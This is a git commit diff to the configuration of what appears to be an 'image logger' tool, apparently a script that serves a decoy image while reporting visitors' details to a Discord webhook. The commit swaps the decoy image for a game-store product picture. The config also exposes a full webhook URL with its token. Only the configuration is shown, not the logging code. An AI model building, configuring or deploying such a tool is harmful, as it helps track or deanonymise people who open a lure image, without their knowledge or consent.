d5c8e76a8800b9e7e7084ee7ef81b718775e1305
aswebone-create <aswebone@outlook.fr>
2026-07-01 15:46:23 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1521868460437803103/vo3UgdMEE5x_tJtSUSjlxh0IQ8K7CkSAoq2Y25pCuSPLtuLK3iB86S5GzBKNZle_enTX",
-    "image": "https://i.pinimg.com/736x/dd/07/30/dd07308bebbe73513a618953f72e9089.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.kinguin.net/g/carousel-main-mobile/media/images/products/20251029021240556_700f54f8-2b2c-4c9a-809e-b8645a193741.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
